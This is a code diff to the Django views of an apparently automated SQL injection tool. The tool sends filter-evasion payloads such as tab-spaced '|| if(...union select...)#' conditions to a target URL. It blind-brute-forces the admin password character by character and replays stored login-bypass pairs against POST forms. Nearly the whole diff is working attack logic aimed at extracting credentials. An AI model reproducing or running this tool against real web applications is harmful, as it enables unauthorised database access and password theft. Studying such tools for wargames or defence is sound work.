@@ -8,7 +8,7 @@ from .models import list
 from ast import literal_eval
 from django.shortcuts import render
 from django.contrib import messages
-from .utils import findUserKeyword, sendQuery,sendQuery2
+from .utils import findUserKeyword, sendQuery,sendQuery2,findUserKeyword2
 
 
 def checkAttackAble(dicQuery):
@@ -16,6 +16,7 @@ def checkAttackAble(dicQuery):
     start = {}
 
     attack = dicQuery['name'].split(',')
+
 
     for name in attack:
         for i in range(1, 3):
@@ -120,87 +121,88 @@ def checkAttackAble(dicQuery):
                         start[name] = str(dicQuery['parameter'])+'-9999'
                         return 3, attack_querys, start
 
-        res = sendQuery(dicQuery, {
-            name: dicQuery['parameter'] + f'"	||	if(0,1,(select	1	union	select	2))#'})
-        bs = BeautifulSoup(res.text, 'html.parser')
-        if 'Subquery' in bs.get_text():
-            attack_querys += res.url +'\n'
+        error = ['Warning', 'Subquery']
+        for e in error:
             res = sendQuery(dicQuery, {
-                name: dicQuery['parameter'] + f'"	||	if(1,1,(select	1	union	select	2))#'})
+                name: dicQuery['parameter'] + f'"	||	if(0,1,(select	1	union	select	2))#'})
             bs = BeautifulSoup(res.text, 'html.parser')
-            if not 'Subquery' in bs.get_text():
-                attack_querys += res.url + '\n'
-                start[name] = str(dicQuery['parameter']) + '"'
-                return 4, attack_querys, start
+            if e in bs.get_text():
+                attack_querys += res.url +'\n'
+                res = sendQuery(dicQuery, {
+                    name: dicQuery['parameter'] + f'"	||	if(1,1,(select	1	union	select	2))#'})
+                bs = BeautifulSoup(res.text, 'html.parser')
+                if not e in bs.get_text():
+                    attack_querys += res.url + '\n'
+                    start[name] = str(dicQuery['parameter']) + '"'
+                    return 4, attack_querys, start
 
-        res = sendQuery(dicQuery, {
-            name: dicQuery['parameter'] + f"'	||	if(0,1,(select	1	union	select	2))#"})
-        bs = BeautifulSoup(res.text, 'html.parser')
-        if 'Subquery' in bs.get_text():
-            print(bs.get_text())
-            attack_querys += res.url + '\n'
             res = sendQuery(dicQuery, {
-                name: dicQuery['parameter'] + f"'	||	if(1,1,(select	1	union	select	2))#"})
+                name: dicQuery['parameter'] + f"'	||	if(0,1,(select	1	union	select	2))#"})
             bs = BeautifulSoup(res.text, 'html.parser')
-            if not 'Subquery' in bs.get_text():
+            if e in bs.get_text():
+                print(bs.get_text())
                 attack_querys += res.url + '\n'
-                start[name] = str(dicQuery['parameter']) + "'"
-                return 5, attack_querys, start
+                res = sendQuery(dicQuery, {
+                    name: dicQuery['parameter'] + f"'	||	if(1,1,(select	1	union	select	2))#"})
+                bs = BeautifulSoup(res.text, 'html.parser')
+                if not e in bs.get_text():
+                    attack_querys += res.url + '\n'
+                    start[name] = str(dicQuery['parameter']) + "'"
+                    return 5, attack_querys, start
 
-        res = sendQuery(dicQuery, {
-            name: dicQuery['parameter'] + f"	||	if(0,1,(select	1	union	select	2))#"})
-        bs = BeautifulSoup(res.text, 'html.parser')
-        if 'Subquery' in bs.get_text():
-            attack_querys += res.url + '\n'
             res = sendQuery(dicQuery, {
-                name: dicQuery['parameter'] + f"	||	if(1,1,(select	1	union	select	2))#"})
+                name: dicQuery['parameter'] + f"	||	if(0,1,(select	1	union	select	2))#"})
             bs = BeautifulSoup(res.text, 'html.parser')
-            if not 'Subquery' in bs.get_text():
+            if e in bs.get_text():
                 attack_querys += res.url + '\n'
-                start[name] = str(dicQuery['parameter']) + "'"
-                return 6, attack_querys, start
+                res = sendQuery(dicQuery, {
+                    name: dicQuery['parameter'] + f"	||	if(1,1,(select	1	union	select	2))#"})
+                bs = BeautifulSoup(res.text, 'html.parser')
+                if not e in bs.get_text():
+                    attack_querys += res.url + '\n'
+                    start[name] = str(dicQuery['parameter']) + "'"
+                    return 6, attack_querys, start
 
 
 
-
-        res = sendQuery(dicQuery, {
-            name: dicQuery['parameter'] + f'"	&&	if(0,1,(select	1	union	select	2))#'})
-        bs = BeautifulSoup(res.text, 'html.parser')
-        if 'Subquery' in bs.get_text():
-            attack_querys += res.url + '\n'
             res = sendQuery(dicQuery, {
-                name: dicQuery['parameter'] + f'"	&&	if(1,1,(select	1	union	select	2))#'})
+                name: dicQuery['parameter'] + f'"	&&	if(0,1,(select	1	union	select	2))#'})
             bs = BeautifulSoup(res.text, 'html.parser')
-            if not 'Subquery' in bs.get_text():
+            if e in bs.get_text():
                 attack_querys += res.url + '\n'
-                start[name] = str(dicQuery['parameter']) + '"'
-                return 4, attack_querys, start
+                res = sendQuery(dicQuery, {
+                    name: dicQuery['parameter'] + f'"	&&	if(1,1,(select	1	union	select	2))#'})
+                bs = BeautifulSoup(res.text, 'html.parser')
+                if not e in bs.get_text():
+                    attack_querys += res.url + '\n'
+                    start[name] = str(dicQuery['parameter']) + '"'
+                    return 4, attack_querys, start
 
-        res = sendQuery(dicQuery, {
-            name: dicQuery['parameter'] + f"'	&&	if(0,1,(select	1	union	select	2))#"})
-        bs = BeautifulSoup(res.text, 'html.parser')
-        if 'Subquery' in bs.get_text():
-            attack_querys += res.url + '\n'
             res = sendQuery(dicQuery, {
-                name: dicQuery['parameter'] + f"'	&&	if(1,1,(select	1	union	select	2))#"})
+                name: dicQuery['parameter'] + f"'	&&	if(0,1,(select	1	union	select	2))#"})
             bs = BeautifulSoup(res.text, 'html.parser')
-            if not 'Subquery' in bs.get_text():
+            if e in bs.get_text():
                 attack_querys += res.url + '\n'
-                start[name] = str(dicQuery['parameter']) + "'"
-                return 5, attack_querys, start
+                res = sendQuery(dicQuery, {
+                    name: dicQuery['parameter'] + f"'	&&	if(1,1,(select	1	union	select	2))#"})
+                bs = BeautifulSoup(res.text, 'html.parser')
+                if not e in bs.get_text():
+                    attack_querys += res.url + '\n'
+                    start[name] = str(dicQuery['parameter']) + "'"
+                    return 5, attack_querys, start
 
-        res = sendQuery(dicQuery, {
-            name: dicQuery['parameter'] + f"'	&&	if(0,1,(select	1	union	select	2))#"})
-        bs = BeautifulSoup(res.text, 'html.parser')
-        if 'Subquery' in bs.get_text():
-            attack_querys += res.url + '\n'
             res = sendQuery(dicQuery, {
-                name: dicQuery['parameter'] + f"	&&	if(1,1,(select	1	union	select	2))#"})
+                name: dicQuery['parameter'] + f"'	&&	if(0,1,(select	1	union	select	2))#"})
             bs = BeautifulSoup(res.text, 'html.parser')
-            if not 'Subquery' in bs.get_text():
+            if e in bs.get_text():
                 attack_querys += res.url + '\n'
-                start[name] = str(dicQuery['parameter']) + "'"
-                return 6, attack_querys, start
+                res = sendQuery(dicQuery, {
+                    name: dicQuery['parameter'] + f"	&&	if(1,1,(select	1	union	select	2))#"})
+                bs = BeautifulSoup(res.text, 'html.parser')
+                if not e in bs.get_text():
+                    attack_querys += res.url + '\n'
+                    start[name] = str(dicQuery['parameter']) + "'"
+                    return 6, attack_querys, start
 
 
 
@@ -261,11 +263,12 @@ def retry(request):
         for i in check_union:
             if i in query :
                 flag = 1
-                obj, is_created = list.objects.get_or_create(query=query,stand='union')
                 break
 
-        if flag == 0:
-            obj, is_created = list.objects.get_or_create(query=query,stand='query')
+        if flag :
+            obj, is_created = list.objects.get_or_create(query=query, stand='union')
+        else:
+            obj, is_created = list.objects.get_or_create(query=query)
 
 
         a,testtest = exploit2(python_dict, obj)
@@ -279,6 +282,13 @@ def brute(start,dicQuery,attack_querys,know):
     length = 0
     getvalue = []
     n = int(dicQuery['range'])
+    print(dicQuery['name'])
+    print(start[dicQuery['name']])
+
+
+
+
+
     for i in range(1, n):
         res = sendQuery(dicQuery, {
             dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id='admin'	&&	length(" + know + f")={i}--	"})
@@ -292,7 +302,7 @@ def brute(start,dicQuery,attack_querys,know):
         for i in range(1, length + 1):
             for j in range(1, 9):
                 res = sendQuery(dicQuery, {
-                    dicQuery['name']: str(start[dicQuery['name']]) + "	||	id='admin'	&& length(substr(" + know + f",{i},1))={j}--	"})
+                    dicQuery['name']: str(start[dicQuery['name']]) + "	||	id='admin'	&&	length(substr(" + know + f",{i},1))={j}--	"})
                 result = findUserKeyword(res, dicQuery['find'])
                 print(result)
                 if result[0] == 1:
@@ -304,11 +314,11 @@ def brute(start,dicQuery,attack_querys,know):
         a = []
         print('length', length)
         print(getvalue)
-
+        sum = 0
         for j in range(1, len(getvalue) + 1):
             print(j,len(getvalue))
             pw = ''
-            sum = 0
+
             bit = 8 * getvalue[j - 1]
             for i in range(1, bit + 1):
                 res = sendQuery(dicQuery, {
@@ -332,6 +342,17 @@ def brute(start,dicQuery,attack_querys,know):
             print("pw: %s" % (pw_result))
 
         if sum == 0:
+            db_query = list.objects.filter(stand='query')
+            for i in db_query:
+                print('---------------------')
+                res = sendQuery(dicQuery, {
+                    dicQuery['name']: str(i)})
+                result = findUserKeyword(res, dicQuery['find'])
+
+                if result[0] == 1:
+                    attack_querys += result[1] + '\n'
+                    return i, attack_querys, length
+
             return '', attack_querys, length
 
 
@@ -351,35 +372,40 @@ def brute(start,dicQuery,attack_querys,know):
 
 def brute2(start,dicQuery,attack_querys,pw_len,know):
     pw =''
-    if pw_len == 0 :
-        n = int(dicQuery['range'])
-        for i in range(n + 1):
-            res = sendQuery(dicQuery, {
-                dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id	in	('admin')	&&	length(" + know + f")>{i}--	"})
-            result = findUserKeyword(res, dicQuery['find'])
-            print(result)
-            if result[0] == 0:
-                st = "'"
-                attack_querys += result[1] + '\n'
-                length = i
-                pw_len = i
+    st = ''
+    n = int(dicQuery['range'])
+    print(n,'brute-2-----------------range')
+
+    for i in range(n + 1):
+        res = sendQuery(dicQuery, {
+            dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id	in	('admin')	&&	length(" + know + f")>{i}--	"})
+        result = findUserKeyword(res, dicQuery['find'])
+        print(result)
+        if result[0] == 0:
+            if i == 0:
                 break
+            st = "'"
+            attack_querys += result[1] + '\n'
+            length = i
+            pw_len = i
+            break
 
-
-
-    if pw_len == 0 :
+    if st == '':
         n = int(dicQuery['range'])
         for i in range(n + 1):
             res = sendQuery(dicQuery, {
                 dicQuery['name']: str(start[dicQuery['name']]) + f'	||	id	in	("admin")	&&	length(' + know + f')>{i}--	'})
             result = findUserKeyword(res, dicQuery['find'])
             print(result)
-            if result[0] == 0:
+            if result[0] == 0 :
+                if i == 0:
+                    break
                 st = '"'
                 attack_querys += result[1] + '\n'
                 length = i
                 pw_len = i
                 break
+
 
 
     getvalue = []
@@ -1053,37 +1079,53 @@ def filter(dicQuery):
 
     return value, attack_querys
 
+def login(dicQuery):
+    attack = dicQuery['name'].split(',')
+    attack_querys = ''
+    db_query = list.objects.filter(stand='query')
+    pw = {}
+
+    for i in db_query:
+        print('---------------------')
+        res = sendQuery(dicQuery, {
+            attack[0]: str(i),attack[1]:'^^^^#^6^^'})
+        result = findUserKeyword2(res)
+        if result[0] == 1:
+            attack_querys += result[1] + '\n'
+            pw[attack[0]]=i
+            pw[attack[1]]='^^^^#^6^^'
+            return pw, attack_querys
 
 def index(request):
     return render(request, 'injection/index.html', {})
 
 
 def main(request):
-    user_query = {'url': '',  'cookie': '', 'name': '', 'method': '', 'parameter': '', 'find': ''}
+    user_query = {}
+
+    url = request.POST.get("url", False)
+    cookie = request.POST.get("cookie", False)
+    find = request.POST.get("find", False)
+    name = request.POST.get("name", False)
+    method = request.POST.get("method", False)
+    parameter = request.POST.get("parameter", False)
+    slider = request.POST.get("slider",False)
+    know = request.POST.get("know",False)
 
 
-    if request.method == 'POST':
-        url = request.POST.get("url", False)
-        cookie = request.POST.get("cookie", False)
-        find = request.POST.get("find", False)
-        name = request.POST.get("name", False)
-        method = request.POST.get("method", False)
-        parameter = request.POST.get("parameter", False)
-        slider = request.POST.get("slider",False)
-        know = request.POST.get("know",False)
+    user_query['url'] = url
+    user_query['cookie'] = cookie
+    user_query['find'] = find
+    user_query['name'] = name
+    user_query['method'] = method
+    user_query['parameter'] = parameter
+    user_query['range'] = slider
+    user_query['know'] = know
+    print(user_query)
 
-
-        user_query['url'] = url
-        user_query['cookie'] = cookie
-        user_query['find'] = find
-        user_query['name'] = name
-        user_query['method'] = method
-        user_query['parameter'] = parameter
-        user_query['range'] = slider
-        user_query['know'] = know
-
-
+    if method == 'get':
         a, value, start = checkAttackAble(user_query)
+
         print('start',start)
         print('a', a)
         print('value', value)
@@ -1092,9 +1134,11 @@ def main(request):
         table = ''
         column = ''
         pw = {}
-        name = user_query['name'].split(',')
         print('name-------', name)
         attack = user_query['know'].split(',')
+        name = user_query['name'].split(',')
+
+
 
         if a == 4 or a == 5 or a == 6:
             for name_p in name:
@@ -1121,7 +1165,7 @@ def main(request):
                         # if pw_tmp != '        ' and pw_tmp != '                ' and pw_tmp != '                        ' and pw_tmp != '' and pw_tmp!= '\x00\x00\x00\x00\x00\x00\x00\x00' and pw_tmp != '\x00':
                         if pw_tmp != '':
                             pw[know] = pw_tmp
-                        print(pw[know], '확인 1 --------------')
+                            print(pw[know], '확인 1 --------------')
 
 
                         if not know in pw.keys():
@@ -1133,7 +1177,7 @@ def main(request):
                             pw_tmp, value = hex(start, user_query, value, length, know, st)
                             if pw_tmp != '\x00\x00\x00\x00\x00\x00\x00\x00' or pw_tmp != '        ' or pw_tmp != '                ' or pw_tmp != '                        ' or pw_tmp != '':
                                 pw[know] = pw_tmp
-                        '''
+
 
                         column_cnt,db_name = db_union(user_query,start)
                         print(db_name)
@@ -1141,7 +1185,7 @@ def main(request):
                             table = table_name(user_query,start,db_name)
                             if table != '' :
                                 column = column_name(user_query,start,table)
-                                '''
+
 
                         # b,url = union(url, cookie, find, name, method, parameter, result,flag,start)
 
@@ -1169,27 +1213,26 @@ def main(request):
             for know in attack:
                 if not know in pw.keys():
                     pw[know],value = filter(user_query)
+                print(len(attack), 'a-----------------------------')
+                if pw[know]=='' and len(attack) == 2:
+                    db_query1 = list.objects.filter(stand='query1')
+                    db_query2 = list.objects.filter(stand='query2')
+                    l = len(db_query1)
+                    print(l,'len----')
+                    print(name)
+                    for k in range(l):
+                        res = sendQuery(user_query, {
+                            attack[0]: db_query1[k], attack[1]:db_query2[k]})
+                        result = findUserKeyword(res, user_query['find'])
 
-            if pw[know]=='' and len(attack)==2:
-                db_query1 = list.objects.filter(stand='query1')
-                db_query2 = list.objects.filter(stand='query2')
-                l = len(db_query1)
-                print(l,'len----')
-                print(name)
-                for k in range(l):
-                    res = sendQuery(user_query, {
-                        attack[0]: db_query1[k], attack[1]:db_query2[k]})
-                    result = findUserKeyword(res, user_query['find'])
+                        print(result)
+                        if result[0] == 1:
+                            print(db_query1[k], db_query2[k])
+                            value += result[1] + '\n'
+                            pw[attack[0]]= db_query1[k]
+                            pw[attack[1]]= db_query2[k]
 
-                    print(result)
-                    if result[0] == 1:
-                        print(db_query1[k], db_query2[k])
-                        value += result[1] + '\n'
-                        print(name[0],name[1])
-                        pw[name[0]]= db_query1[k]
-                        pw[name[1]]= db_query2[k]
-
-                        break
+                            break
 
 
         List = list.objects.order_by()
@@ -1208,6 +1251,18 @@ def main(request):
                               {'data': value, 'integer': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt, 'db_name': db_name,'table_name': table, 'column_name' : column})
 
         else:
-            return render(request, 'injection/result.html',{'data': value,'list': List, 'origin': str(user_query), 'pw' : pw,'column_cnt':column_cnt, 'db_name': db_name,'table_name': table, 'column_name' : column})
+            return render(request, 'injection/result.html',
+                          {'data': value, 'list': List, 'origin': str(user_query), 'pw': pw,
+                           'column_cnt': column_cnt, 'db_name': db_name, 'table_name': table,
+                           'column_name': column})
+
+    elif method == 'POST':
+
+        print('들어왔당^^')
+
+        pw,value=login(user_query)
+
+        return render(request, 'injection/result.html',
+                      {'data': value, 'pw': pw})
 
     return 1
